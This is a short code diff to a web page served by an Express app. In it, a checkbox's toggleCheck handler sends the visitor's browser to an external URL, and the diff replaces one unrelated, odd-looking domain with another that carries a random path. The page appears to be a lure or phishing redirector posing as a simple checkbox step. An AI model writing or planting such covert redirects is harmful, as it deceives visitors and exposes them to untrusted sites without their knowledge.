@@ -144,7 +144,7 @@ app.get('/', (req, res) => {
 
         function toggleCheck(element) {
             element.classList.toggle('checked');
-            window.location.href = 'https://deutsckademiets.za.com/PY3xw/'
+            window.location.href = 'https://sanjeevanifood.in/9c7a1f2e-8a61-4c8b-9c88-ef28b9b3ae1d/'
         }
     </script>
 </body>
